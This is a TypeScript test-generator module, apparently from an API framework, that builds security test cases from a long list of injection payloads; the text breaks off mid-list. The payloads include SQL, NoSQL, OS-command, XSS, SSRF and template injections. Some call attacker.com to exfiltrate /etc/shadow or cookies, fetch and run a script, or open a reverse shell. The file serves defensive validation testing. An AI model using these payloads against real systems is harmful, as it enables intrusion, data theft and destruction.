import { RouteDocumentation, DocumentationGenerator } from './documentationGenerator';
import { Schema, FieldSchema } from './validator';
import { RequestConfig, ResponseConfig } from './requestHandler';
import { log } from '../external/winston';
import * as ejs from 'ejs';
import * as path from 'path';
import * as fs from 'fs';

export interface TestCase {
    name: string;
    description: string;
    type: 'success' | 'failure';
    endpoint: string;
    method: string;
    data?: {
        query?: any;
        params?: any;
        body?: any;
    };
    expectedStatus: number;
    acceptableStatuses?: number[]; // For security tests: allow both blocked (422) and success (2xx) responses
    expectedData?: any; // Expected response data for validation
    expectedErrors?: string[];
    validationErrors?: string[];
    securityTestType?: string; // SQL injection, XSS, etc.
}

export interface RouteTestSuite {
    route: RouteDocumentation;
    testCases: TestCase[];
}

export interface RouteGroup {
    id: string;
    path: string;
    routes: RouteTestSuite[];
    totalTests: number;
}

export interface TestReportStats {
    totalRoutes: number;
    totalTests: number;
    successTests: number;
    failureTests: number;
    securityTests: number;
    philosophyTests: number;
    philosophyScore: number; // 전체 철학 준수 점수
    philosophyViolations: PhilosophyViolation[];
}

export interface PhilosophyViolation {
    type: 'naming' | 'restful' | 'http-spec' | 'structure' | 'security' | 'performance' | 'consistency';
    severity: 'error' | 'warning' | 'info';
    message: string;
    suggestion?: string;
    route: string;
    method: string;
    ruleId: string; // 위반된 규칙의 고유 ID
    category: 'route-naming' | 'rest-compliance' | 'http-spec' | 'api-design' | 'security' | 'performance';
    examples?: string[]; // 올바른 사용 예시
    links?: string[]; // 관련 문서 링크
}

export interface PhilosophyValidationResult {
    violations: PhilosophyViolation[];
    isValid: boolean;
    score: number; // 0-100, 철학 준수 점수
}

export class TestGenerator {
    private static routes: RouteDocumentation[] = [];
    private static viewsPath = path.join(__dirname, 'views');

    // Map: irregular → true, invariant → false
    private static specialForms = new Map<string, boolean>([
        // Irregular plurals
        ["men", true], ["women", true], ["children", true], ["teeth", true], ["feet", true],
        ["mice", true], ["geese", true], ["people", true], ["oxen", true], ["cacti", true],
        ["alumni", true], ["dice", true], ["data", true], ["bacteria", true], ["media", true],
        ["fungi", true], ["theses", true], ["analyses", true], ["crises", true], ["phenomena", true],
        ["criteria", true], ["stimuli", true], ["matrices", true], ["appendices", true],
        ["indices", true], ["lice", true], ["knives", true], ["wolves", true], ["leaves", true],
        ["loaves", true], ["selves", true], ["lives", true], ["elves", true], ["hooves", true],

        // Invariant forms (false = not plural despite ending with s)
        ["sheep", false], ["fish", false], ["deer", false], ["species", false], ["series", false],
        ["aircraft", false], ["moose", false], ["salmon", false], ["bison", false], ["shrimp", false],
        ["trout", false], ["tuna", false], ["swine", false], ["offspring", false],
        ["hovercraft", false], ["spacecraft", false], ["means", false]
    ]);

    // Words that end with "s" but are actually singular
    private static singularSEndingExceptions = new Set([
        "glass", "class", "boss", "pass", "kiss", "loss", "miss", "access", "process", "business"
    ]);

    // Plural suffix rules with early-exit optimization
    private static pluralRules: [RegExp, (w: string) => boolean][] = [
        [/ies$/, w => w.length > 4],               // babies, cities
        [/ves$/, w => w.length > 4],               // leaves, wolves
        [/oes$/, w => w.length > 4],               // heroes
        [/((ch|sh|s|x|z)es)$/, w => w.length > 4], // boxes, dishes
        [/s$/, w => !w.endsWith("ss") && w.length > 3] // cats, dogs
    ];    /**
     * 단어가 복수형인지 확인
     */
    private static isPlural(word: string): boolean {
        const w = word.toLowerCase();

        if (w.length <= 2 || !/^[a-z]+$/.test(w)) return false;

        if (this.specialForms.has(w)) return this.specialForms.get(w)!;
        if (this.singularSEndingExceptions.has(w)) return false;

        for (const [regex, validator] of this.pluralRules) {
            if (regex.test(w) && validator(w)) return true;
        }

        return false;
    }

    /**
     * HTML 이스케이핑 - XSS 방지를 위한 필수 보안 조치
     */
    private static escapeHtml(unsafe: string): string {
        return unsafe
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;")
            .replace(/\//g, "&#x2F;");
    }

    /**
     * JSON 데이터를 안전하게 HTML에 출력하기 위한 이스케이핑
     */
    private static escapeJsonForHtml(obj: any): string {
        try {
            const jsonStr = JSON.stringify(obj, null, 2);
            return this.escapeHtml(jsonStr);
        } catch (error) {
            return this.escapeHtml(String(obj));
        }
    }

    /**
     * 테스트 데이터 값을 안전하게 표시하기 위한 함수
     */
    private static safeDisplayValue(value: any): string {
        if (value === null) return 'null';
        if (value === undefined) return 'undefined';
        if (typeof value === 'string') {
            // 문자열은 이스케이핑하고 따옴표로 감싸기
            return `"${this.escapeHtml(value)}"`;
        }
        if (typeof value === 'object') {
            // 객체는 JSON으로 변환 후 이스케이핑
            return this.escapeJsonForHtml(value);
        }
        // 다른 타입들은 문자열로 변환 후 이스케이핑
        return this.escapeHtml(String(value));
    }

    /**
     * 테스트 기능 활성화 여부 확인
     */
    private static isTestingEnabled(): boolean {
        return process.env.NODE_ENV !== 'production' && process.env.AUTO_DOCS === 'true';
    }

    /**
     * 모든 라우트의 테스트 케이스 생성
     */
    static generateAllTestCases(): RouteTestSuite[] {
        if (!this.isTestingEnabled()) {
            return [];
        }

        this.routes = DocumentationGenerator.getRoutes();
        const testSuites: RouteTestSuite[] = [];

        for (const route of this.routes) {
            const testCases = this.generateTestCasesForRoute(route);
            testSuites.push({
                route,
                testCases
            });
        }

        return testSuites;
    }


    /**
     * 라우트에서 정의된 응답 상태 코드 추출
     * 
     * IMPORTANT: This method now uses smart validation error code selection logic
     * that prioritizes route-defined status codes over system defaults to ensure 
     * test cases match actual route implementations.
     * 
     * For validation errors, the selection priority is:
     * 1. 422 (HTTP standard for validation errors) if defined in route
     * 2. 400 (common alternative for validation errors) if defined in route  
     * 3. First available 4xx error code defined in route
     * 4. 422 as system fallback
     */
    private static extractDefinedStatusCodes(route: RouteDocumentation): {
        successCodes: number[];
        errorCodes: number[];
        allCodes: number[];
    } {
        const successCodes: number[] = [];
        const errorCodes: number[] = [];
        const allCodes: number[] = [];

        if (route.responses) {
            const statusCodes = Object.keys(route.responses).map(Number).filter(code => !isNaN(code));

            for (const code of statusCodes) {
                allCodes.push(code);
                if (code >= 200 && code < 300) {
                    successCodes.push(code);
                } else if (code >= 400) {
                    errorCodes.push(code);
                }
            }
        }        // Fallback to standard codes if none defined
        if (successCodes.length === 0) {
            successCodes.push(200);
        }
        if (errorCodes.length === 0) {
            errorCodes.push(422); // For validation errors - system default
            errorCodes.push(400); // For bad requests
        }

        return { successCodes, errorCodes, allCodes };
    }

    /**
     * 특정 라우트의 테스트 케이스 생성
     */

    private static generateTestCasesForRoute(route: RouteDocumentation): TestCase[] {
        const testCases: TestCase[] = [];        // 0. 개발 철학 검증 케이스 생성
        const philosophyCases = this.generatePhilosophyTestCases(route);
        testCases.push(...philosophyCases);

        // // 1. 성공 케이스 생성
        // const successCase = this.generateSuccessCase(route);
        // if (successCase) {
        //     testCases.push(successCase);
        // }

        // 2. 실패 케이스 생성
        const failureCases = this.generateFailureCases(route);
        testCases.push(...failureCases);

        return testCases;
    }

    /**
     * 성공 케이스 생성
     */
    private static generateSuccessCase(route: RouteDocumentation): TestCase | null {
        const validData = this.generateValidData(route.parameters);
        const { successCodes } = this.extractDefinedStatusCodes(route);

        // Use the first defined success status code, or default to 200
        const expectedStatus = successCodes[0] || 200;
        let expectedData = undefined;

        if (route.responses && route.responses[expectedStatus]) {
            const responseSchema = route.responses[expectedStatus];
            // Generate expected response data based on schema
            if (responseSchema && typeof responseSchema === 'object') {
                expectedData = this.generateExpectedResponseData(responseSchema, validData);
            }
        }

        const testCase: TestCase = {
            name: `${route.method} ${route.path} - Success Case`,
            description: `Valid request with all required fields (expects ${expectedStatus})`,
            type: 'success',
            endpoint: route.path,
            method: route.method,
            data: validData,
            expectedStatus
        };

        // Add expected data if available
        if (expectedData) {
            testCase.expectedData = expectedData;
        }

        return testCase;
    }

    /**
     * 실패 케이스 생성
     */
    private static generateFailureCases(route: RouteDocumentation): TestCase[] {
        const failureCases: TestCase[] = [];

        if (!route.parameters) {
            return failureCases;
        }

        // 각 파라미터 위치별로 실패 케이스 생성
        const locations: Array<keyof typeof route.parameters> = ['query', 'params', 'body'];

        for (const location of locations) {
            const schema = route.parameters[location];
            if (schema) {
                failureCases.push(...this.generateSchemaFailureCases(route, location, schema));
            }
        }

        return failureCases;
    }

    /**
     * 스키마별 실패 케이스 생성
     */
    private static generateSchemaFailureCases(
        route: RouteDocumentation,
        location: string,
        schema: Schema
    ): TestCase[] {
        const cases: TestCase[] = [];

        for (const [fieldName, fieldSchema] of Object.entries(schema)) {
            // Required 필드 누락 테스트
            if (fieldSchema.required) {
                cases.push(...this.generateMissingFieldCase(route, location, fieldName));
            }

            // 타입 검증 실패 테스트
            cases.push(...this.generateTypeValidationCases(route, location, fieldName, fieldSchema));

            // 범위 검증 실패 테스트
            cases.push(...this.generateRangeValidationCases(route, location, fieldName, fieldSchema));

            // 보안 공격 테스트 케이스 생성
            cases.push(...this.generateSecurityTestCases(route, location, fieldName, fieldSchema));
        }

        return cases;
    }

    /**
     * 보안 공격 테스트 케이스 생성 (SQL 인젝션, 특수문자)
     */
    private static generateSecurityTestCases(
        route: RouteDocumentation,
        location: string,
        fieldName: string,
        fieldSchema: FieldSchema
    ): TestCase[] {
        const cases: TestCase[] = [];
        const invalidData = this.generateValidData(route.parameters); const { errorCodes, successCodes, allCodes } = this.extractDefinedStatusCodes(route);        // Smart validation error code selection for security tests:
        // HTTP Standard: 422 Unprocessable Entity is the official status code for validation errors
        // Always expect 422 as primary, with route-defined codes as additional acceptable statuses
        const primaryValidationCode = 422;

        // For security tests, accept both blocked (validation error) and success responses
        // since ORM protection effectiveness varies. Use Set to avoid duplicates.
        const acceptableStatusesSet = new Set([
            primaryValidationCode,
            ...errorCodes.filter(code => code >= 400 && code < 500), // All 4xx error codes from route
            ...successCodes.filter(code => code < 300) // All 2xx success codes from route
        ]);
        const acceptableStatuses = Array.from(acceptableStatusesSet);

        if (!invalidData[location]) return cases;

        // 필드 타입에 따라 다른 공격 패턴 적용
        const attackPatterns = this.getSecurityAttackPatterns(fieldSchema.type); for (const pattern of attackPatterns) {
            const attackData = JSON.parse(JSON.stringify(invalidData)); // 깊은 복사
            attackData[location][fieldName] = pattern.value; cases.push({
                name: `${route.method} ${route.path} - Security Attack: ${pattern.type} for ${location}.${fieldName}`,
                description: `${pattern.description} in ${location} parameter: ${fieldName}`,
                type: 'failure',
                endpoint: route.path,
                method: route.method,
                data: attackData,
                expectedStatus: primaryValidationCode, // Primary expectation: blocked by validation
                acceptableStatuses: acceptableStatuses, // Accept either blocked or success - ORM protection is flexible
                validationErrors: [`${fieldName} contains potentially malicious content`],
                securityTestType: pattern.type
            });
        }

        return cases;
    }    /**
     * 필드 타입별 보안 공격 패턴 생성
     */
    private static getSecurityAttackPatterns(fieldType: string): Array<{ type: string, value: any, description: string }> {
        const patterns: Array<{ type: string, value: any, description: string }> = [];

        // === 데이터베이스 공격 패턴 ===

        // 공통 SQL Injection 패턴 (기본)
        const sqlInjectionPatterns = [
            {
                type: 'SQLi-Basic',
                value: "' OR '1'='1",
                description: 'Basic SQL injection attack'
            },
            {
                type: 'SQLi-Comment',
                value: "'; --",
                description: 'SQL injection with comment'
            },
            {
                type: 'SQLi-Union',
                value: "' UNION SELECT username,password FROM users; --",
                description: 'UNION-based SQL injection attack'
            },
            {
                type: 'SQLi-Batch',
                value: "'; DROP TABLE users; --",
                description: 'Batch SQL injection attack'
            }
        ];

        // PostgreSQL 특화 공격 패턴
        const postgresqlPatterns = [
            {
                type: 'PostgreSQL-PgSleep',
                value: "'; SELECT pg_sleep(10); --",
                description: 'PostgreSQL time-based blind SQL injection with pg_sleep'
            },
            {
                type: 'PostgreSQL-FileRead',
                value: "'; COPY (SELECT '') TO '/tmp/output.txt'; --",
                description: 'PostgreSQL file system interaction attack'
            },
            {
                type: 'PostgreSQL-LargeObject',
                value: "'; SELECT lo_import('/etc/passwd'); --",
                description: 'PostgreSQL large object file read attack'
            },
            {
                type: 'PostgreSQL-Version',
                value: "' AND (SELECT version())::text LIKE '%PostgreSQL%",
                description: 'PostgreSQL version fingerprinting attack'
            },
            {
                type: 'PostgreSQL-CString',
                value: "\\x00\\x27\\x4f\\x52\\x20\\x27\\x31\\x27\\x3d\\x27\\x31",
                description: 'PostgreSQL C-style string encoding bypass'
            }
        ];

        // MySQL 특화 공격 패턴
        const mysqlPatterns = [
            {
                type: 'MySQL-Sleep',
                value: "'; SELECT SLEEP(10); --",
                description: 'MySQL time-based blind SQL injection with SLEEP'
            },
            {
                type: 'MySQL-LoadFile',
                value: "' UNION SELECT LOAD_FILE('/etc/passwd'); --",
                description: 'MySQL file read attack using LOAD_FILE'
            },
            {
                type: 'MySQL-IntoOutfile',
                value: "' INTO OUTFILE '/tmp/shell.php'; --",
                description: 'MySQL file write attack using INTO OUTFILE'
            },
            {
                type: 'MySQL-Benchmark',
                value: "' AND BENCHMARK(1000000,MD5(1)); --",
                description: 'MySQL DoS attack using BENCHMARK function'
            },
            {
                type: 'MySQL-HexEncoding',
                value: "0x2720554e494f4e2053454c4543542075736572286029",
                description: 'MySQL hex encoding bypass for SQL injection'
            }
        ];

        // MSSQL 특화 공격 패턴
        const mssqlPatterns = [
            {
                type: 'MSSQL-Waitfor',
                value: "'; WAITFOR DELAY '00:00:10'; --",
                description: 'MSSQL time-based blind SQL injection with WAITFOR'
            },
            {
                type: 'MSSQL-XpCmdshell',
                value: "'; EXEC xp_cmdshell('whoami'); --",
                description: 'MSSQL OS command execution via xp_cmdshell'
            },
            {
                type: 'MSSQL-BulkInsert',
                value: "'; BULK INSERT users FROM 'C:\\temp\\users.csv'; --",
                description: 'MSSQL bulk insert file access attack'
            },
            {
                type: 'MSSQL-OpenRowset',
                value: "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=sa;pwd=pass','SELECT 1'); --",
                description: 'MSSQL linked server attack via OPENROWSET'
            }
        ];

        // Oracle 특화 공격 패턴
        const oraclePatterns = [
            {
                type: 'Oracle-DbmsLock',
                value: "'; BEGIN DBMS_LOCK.SLEEP(10); END; --",
                description: 'Oracle time-based blind SQL injection with DBMS_LOCK'
            },
            {
                type: 'Oracle-UtlFile',
                value: "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN('/tmp','output.txt','W'); END; --",
                description: 'Oracle file system interaction via UTL_FILE'
            },
            {
                type: 'Oracle-HttpRequest',
                value: "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/steal?data='||USER) FROM DUAL; --",
                description: 'Oracle data exfiltration via HTTP request'
            },
            {
                type: 'Oracle-XmlType',
                value: "' AND EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]>'),'/l') IS NOT NULL; --",
                description: 'Oracle XXE attack via XMLType'
            }
        ];

        // MongoDB NoSQL Injection 패턴
        const mongodbPatterns = [
            {
                type: 'MongoDB-Where',
                value: "\"; return true; //",
                description: 'MongoDB JavaScript injection via $where operator'
            },
            {
                type: 'MongoDB-MapReduce',
                value: "function(){return this.password;}",
                description: 'MongoDB MapReduce JavaScript injection'
            },
            {
                type: 'MongoDB-Regex',
                value: { $regex: ".*" },
                description: 'MongoDB regex injection for authentication bypass'
            },
            {
                type: 'MongoDB-Ne',
                value: { $ne: null },
                description: 'MongoDB $ne operator injection'
            }
        ];

        // Redis 공격 패턴
        const redisPatterns = [
            {
                type: 'Redis-Command',
                value: "\r\n*1\r\n$8\r\nFLUSHALL\r\n",
                description: 'Redis protocol injection to flush all data'
            },
            {
                type: 'Redis-Eval',
                value: "\\r\\n*3\\r\\n$4\\r\\nEVAL\\r\\n$23\\r\\nreturn redis.call('flushall')\\r\\n$1\\r\\n0\\r\\n",
                description: 'Redis Lua script injection via EVAL'
            },
            {
                type: 'Redis-Config',
                value: "\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n",
                description: 'Redis configuration manipulation attack'
            }
        ];

        // === OS 명령어 주입 공격 패턴 ===

        // Linux/Unix 명령어 주입
        const linuxCommandPatterns = [
            {
                type: 'Linux-Basic',
                value: "; cat /etc/passwd",
                description: 'Linux basic command injection to read passwd file'
            },
            {
                type: 'Linux-Chained',
                value: "| whoami && id",
                description: 'Linux chained command injection'
            },
            {
                type: 'Linux-Background',
                value: "& curl http://attacker.com/exfil?data=$(cat /etc/shadow | base64) &",
                description: 'Linux background command for data exfiltration'
            },
            {
                type: 'Linux-Substitution',
                value: "$(wget -O- http://attacker.com/payload.sh | sh)",
                description: 'Linux command substitution attack'
            },
            {
                type: 'Linux-Backticks',
                value: "`nc -e /bin/sh attacker.com 4444`",
                description: 'Linux reverse shell via backticks'
            },
            {
                type: 'Linux-EnvVar',
                value: "${PATH:0:1}bin${PATH:0:1}sh",
                description: 'Linux environment variable manipulation'
            },
            {
                type: 'Linux-Null',
                value: "cat\x00/etc/passwd",
                description: 'Linux null byte injection'
            }
        ];

        // Windows 명령어 주입
        const windowsCommandPatterns = [
            {
                type: 'Windows-Basic',
                value: "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                description: 'Windows basic command injection to read hosts file'
            },
            {
                type: 'Windows-Dir',
                value: "| dir C:\\ && whoami",
                description: 'Windows directory listing and user identification'
            },
            {
                type: 'Windows-Powershell',
                value: "; powershell -Command \"Get-Process\"",
                description: 'Windows PowerShell command injection'
            },
            {
                type: 'Windows-Wmic',
                value: "& wmic process list full",
                description: 'Windows WMI command line process enumeration'
            },
            {
                type: 'Windows-Net',
                value: "| net user administrator /add",
                description: 'Windows user account manipulation'
            },
            {
                type: 'Windows-Reg',
                value: "& reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                description: 'Windows registry query attack'
            },
            {
                type: 'Windows-Certutil',
                value: "; certutil -urlcache -split -f http://attacker.com/payload.exe C:\\temp\\payload.exe",
                description: 'Windows file download via certutil'
            }
        ];

        // macOS 특화 명령어 주입
        const macosCommandPatterns = [
            {
                type: 'macOS-Defaults',
                value: "; defaults read /Library/Preferences/com.apple.loginwindow | grep autoLoginUser",
                description: 'macOS system preferences enumeration'
            },
            {
                type: 'macOS-Launchctl',
                value: "| launchctl list | grep -v com.apple",
                description: 'macOS launch services enumeration'
            },
            {
                type: 'macOS-Dscl',
                value: "& dscl . list /Users | grep -v '^_'",
                description: 'macOS user account enumeration via dscl'
            },
            {
                type: 'macOS-Plutil',
                value: "; plutil -p /System/Library/LaunchDaemons/ssh.plist",
                description: 'macOS property list file reading'
            }
        ];

        // === 인코딩 및 바이패스 공격 패턴 ===

        const encodingBypassPatterns = [
            {
                type: 'URL-DoubleEncoding',
                value: "%2527%252520OR%252520%2527%2525271%252527%25253D%252527%2525271",
                description: 'Double URL encoding bypass for SQL injection'
            },
            {
                type: 'Unicode-Normalization',
                value: "＇　ＯＲ　＇１＇＝＇１",
                description: 'Unicode full-width character bypass'
            },
            {
                type: 'Base64-SQLi',
                value: "JyBPUiAnMSc9JzE=",
                description: 'Base64 encoded SQL injection payload'
            },
            {
                type: 'Hex-Encoding',
                value: "\\x27\\x20\\x4f\\x52\\x20\\x27\\x31\\x27\\x3d\\x27\\x31",
                description: 'Hex encoded SQL injection bypass'
            },
            {
                type: 'HTML-Entity',
                value: "&#39;&#32;OR&#32;&#39;1&#39;=&#39;1",
                description: 'HTML entity encoded SQL injection'
            },
            {
                type: 'JSON-Unicode',
                value: "\\u0027\\u0020OR\\u0020\\u00271\\u0027=\\u00271",
                description: 'JSON Unicode escape sequence bypass'
            }
        ];

        // === 고급 공격 패턴 ===

        const advancedPatterns = [
            {
                type: 'LDAP-Injection',
                value: "*)(uid=*))(|(uid=*",
                description: 'LDAP injection for authentication bypass'
            },
            {
                type: 'XPath-Injection',
                value: "' or '1'='1' or 'a'='a",
                description: 'XPath injection attack'
            },
            {
                type: 'XXE-Basic',
                value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                description: 'XML External Entity (XXE) attack'
            },
            {
                type: 'SSTI-Jinja2',
                value: "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
                description: 'Server-Side Template Injection for Jinja2'
            },
            {
                type: 'SSTI-Twig',
                value: "{{_self.env.setCache(\"ftp://attacker.com:2121\")}}}",
                description: 'Server-Side Template Injection for Twig'
            },
            {
                type: 'Polyglot-Payload',
                value: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                description: 'Polyglot XSS payload working in multiple contexts'
            },
            {
                type: 'GraphQL-Introspection',
                value: "{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}",
                description: 'GraphQL introspection query for schema disclosure'
            }
        ];

        // === 바이너리 및 메모리 공격 패턴 ===

        const binaryPatterns = [
            {
                type: 'Buffer-Overflow',
                value: "A".repeat(10000),
                description: 'Buffer overflow attempt with excessive A characters'
            },
            {
                type: 'Format-String',
                value: "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
                description: 'Format string vulnerability exploitation'
            },
            {
                type: 'Return-Oriented',
                value: "\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
                description: 'Return-oriented programming shellcode attempt'
            },
            {
                type: 'Integer-Overflow',
                value: "2147483648",
                description: 'Integer overflow attack with max int + 1'
            },
            {
                type: 'Negative-Size',
                value: "-1",
                description: 'Negative size integer attack'
            }
        ];        // 타입별 특수 공격 패턴
        switch (fieldType) {
            case 'string':
                // 문자열 타입에 대한 포괄적 공격
                patterns.push(...sqlInjectionPatterns);
                patterns.push(...postgresqlPatterns);
                patterns.push(...mysqlPatterns);
                patterns.push(...mssqlPatterns);
                patterns.push(...oraclePatterns);
                patterns.push(...mongodbPatterns);
                patterns.push(...redisPatterns);
                patterns.push(...linuxCommandPatterns);
                patterns.push(...windowsCommandPatterns);
                patterns.push(...macosCommandPatterns);
                patterns.push(...encodingBypassPatterns);
                patterns.push(...advancedPatterns);
                patterns.push(...binaryPatterns);

                // 추가 문자열 특화 공격
                patterns.push(
                    {
                        type: 'XSS-Basic',
                        value: "<script>alert('XSS')</script>",
                        description: 'Basic XSS attack'
                    },
                    {
                        type: 'XSS-Attribute',
                        value: "\" onmouseover=\"alert('XSS')\" ",
                        description: 'Event-based XSS attack'
                    },
                    {
                        type: 'XSS-SVG',
                        value: "<svg onload=alert('XSS')>",
                        description: 'SVG-based XSS attack'
                    },
                    {
                        type: 'XSS-IMG',
                        value: "<img src=x onerror=alert('XSS')>",
                        description: 'Image-based XSS attack'
                    },
                    {
                        type: 'XSS-Iframe',
                        value: "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                        description: 'Iframe-based XSS attack'
                    },
                    {
                        type: 'HTML-Injection',
                        value: "<h1>HTML Injection Test</h1><p>Defaced!</p>",
                        description: 'HTML injection for content defacement'
                    },
                    {
                        type: 'CSS-Injection',
                        value: "<style>body{background:url('http://attacker.com/steal?cookie='+document.cookie)}</style>",
                        description: 'CSS injection for data exfiltration'
                    },
                    {
                        type: 'Path-Traversal',
                        value: "../../../etc/passwd",
                        description: 'Directory traversal attack'
                    },
                    {
                        type: 'Path-Traversal-Windows',
                        value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                        description: 'Windows directory traversal attack'
                    },
                    {
                        type: 'Null-Byte',
                        value: "innocent.txt\x00.php",
                        description: 'Null byte injection attack'
                    },
                    {
                        type: 'CRLF-Injection',
                        value: "test\r\nSet-Cookie: admin=true",
                        description: 'CRLF injection for HTTP response splitting'
                    },
                    {
                        type: 'Special-Chars',
                        value: "!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`",
                        description: 'Special character injection'
                    }
                );
                break;

            case 'email':
                // 이메일 타입에 대한 확장된 공격
                patterns.push(
                    {
                        type: 'Email-SQLi',
                        value: "user@example.com' OR '1'='1",
                        description: 'SQL injection in email field'
                    },
                    {
                        type: 'Email-XSS',
                        value: "user@<script>alert('XSS')</script>.com",
                        description: 'XSS in email field'
                    },
                    {
                        type: 'Email-Special',
                        value: "user+bypass@example.com';--",
                        description: 'Email with special characters and SQL injection'
                    },
                    {
                        type: 'Email-Header-Injection',
                        value: "user@example.com\r\nBcc: attacker@evil.com",
                        description: 'Email header injection attack'
                    },
                    {
                        type: 'Email-Unicode',
                        value: "üser@εxample.com",
                        description: 'Unicode email spoofing attack'
                    },
                    {
                        type: 'Email-Homograph',
                        value: "user@еxample.com",
                        description: 'Homograph domain attack using Cyrillic characters'
                    },
                    {
                        type: 'Email-Long',
                        value: "a".repeat(320) + "@example.com",
                        description: 'Overly long email address attack'
                    }
                );
                break;

            case 'url':
                // URL 타입에 대한 확장된 공격
                patterns.push(
                    {
                        type: 'URL-SQLi',
                        value: "https://example.com?id=' OR '1'='1",
                        description: 'SQL injection in URL field'
                    },
                    {
                        type: 'URL-XSS',
                        value: "javascript:alert('XSS')",
                        description: 'JavaScript URL XSS attack'
                    },
                    {
                        type: 'URL-SSRF',
                        value: "http://localhost:3000/admin",
                        description: 'Server Side Request Forgery attempt'
                    },
                    {
                        type: 'URL-PathTraversal',
                        value: "https://example.com/../../../etc/passwd",
                        description: 'Path traversal attack in URL'
                    },
                    {
                        type: 'URL-FileSchema',
                        value: "file:///etc/passwd",
                        description: 'Local file access via file schema'
                    },
                    {
                        type: 'URL-FTP',
                        value: "ftp://attacker.com:21/steal",
                        description: 'FTP URL for potential data exfiltration'
                    },
                    {
                        type: 'URL-LDAP',
                        value: "ldap://attacker.com:389/",
                        description: 'LDAP URL for potential injection'
                    },
                    {
                        type: 'URL-Gopher',
                        value: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
                        description: 'Gopher protocol SSRF for Redis attack'
                    },
                    {
                        type: 'URL-IPv6-Bypass',
                        value: "http://[::1]:3000/admin",
                        description: 'IPv6 localhost bypass attempt'
                    },
                    {
                        type: 'URL-Decimal-IP',
                        value: "http://2130706433/admin",
                        description: 'Decimal IP notation SSRF bypass'
                    }
                );
                break;

            case 'number':
                // 숫자 타입에 대한 확장된 공격
                patterns.push(
                    {
                        type: 'Number-SQLi',
                        value: "1 OR 1=1",
                        description: 'SQL injection in numeric field'
                    },
                    {
                        type: 'Number-Overflow',
                        value: Number.MAX_SAFE_INTEGER + 1,
                        description: 'Integer overflow attack'
                    },
                    {
                        type: 'Number-Underflow',
                        value: Number.MIN_SAFE_INTEGER - 1,
                        description: 'Integer underflow attack'
                    },
                    {
                        type: 'Number-Negative',
                        value: -1,
                        description: 'Negative number attack'
                    },
                    {
                        type: 'Number-Zero',
                        value: 0,
                        description: 'Zero value attack'
                    },
                    {
                        type: 'Number-Infinity',
                        value: Infinity,
                        description: 'Infinity value attack'
                    },
                    {
                        type: 'Number-NaN',
                        value: NaN,
                        description: 'NaN (Not a Number) attack'
                    },
                    {
                        type: 'Number-Scientific',
                        value: "1e308",
                        description: 'Scientific notation overflow attack'
                    },
                    {
                        type: 'Number-Hex',
                        value: "0xFFFFFFFF",
                        description: 'Hexadecimal number injection'
                    },
                    {
                        type: 'Number-Octal',
                        value: "0777",
                        description: 'Octal number injection'
                    }
                );
                break;

            case 'boolean':
                // 불리언 타입에 대한 확장된 공격
                patterns.push(
                    {
                        type: 'Boolean-SQLi',
                        value: "true OR 1=1",
                        description: 'SQL injection in boolean field'
                    },
                    {
                        type: 'Boolean-String',
                        value: "true; DROP TABLE users;",
                        description: 'SQL injection with string in boolean field'
                    },
                    {
                        type: 'Boolean-Object',
                        value: { toString: () => "true; DROP TABLE users;" },
                        description: 'Boolean object with malicious toString method'
                    },
                    {
                        type: 'Boolean-NoSQL',
                        value: { $ne: null },
                        description: 'NoSQL injection in boolean field'
                    }
                );
                break;

            case 'array':
                // 배열 타입에 대한 확장된 공격
                patterns.push(
                    {
                        type: 'Array-SQLi',
                        value: ["normal", "'; DROP TABLE users; --"],
                        description: 'SQL injection in array item'
                    },
                    {
                        type: 'Array-XSS',
                        value: ["normal", "<script>alert('XSS')</script>"],
                        description: 'XSS in array item'
                    },
                    {
                        type: 'Array-Overflow',
                        value: Array(10000).fill("x"),
                        description: 'Array overflow attack with excessive items'
                    }, {
                    type: 'Array-Nested',
                    value: Array(100).fill(null).map(() => Array(100).fill("nested")),
                    description: 'Deeply nested array DoS attack'
                },
                    {
                        type: 'Array-Mixed-Types',
                        value: ["string", 123, { evil: "payload" }, null, undefined],
                        description: 'Mixed type array for type confusion'
                    },
                    {
                        type: 'Array-Circular',
                        value: (() => { const arr: any = []; arr.push(arr); return arr; })(),
                        description: 'Circular reference array attack'
                    },
                    {
                        type: 'Array-Sparse',
                        value: (() => { const arr = new Array(1000); arr[999] = "evil"; return arr; })(),
                        description: 'Sparse array memory consumption attack'
                    }
                );
                break;

            case 'object':
                // 객체 타입에 대한 확장된 공격
                patterns.push(
                    {
                        type: 'Object-Pollution',
                        value: { "__proto__": { "polluted": true } },
                        description: 'Prototype pollution attack'
                    },
                    {
                        type: 'Object-Constructor',
                        value: { "constructor": { "prototype": { "polluted": true } } },
                        description: 'Constructor prototype pollution'
                    },
                    {
                        type: 'Object-SQLi',
                        value: { "key": "value", "injection": "' OR '1'='1" },
                        description: 'SQL injection in object property'
                    },
                    {
                        type: 'Object-XSS',
                        value: { "key": "<script>alert('XSS')</script>" },
                        description: 'XSS in object property'
                    },
                    {
                        type: 'Object-DoS',
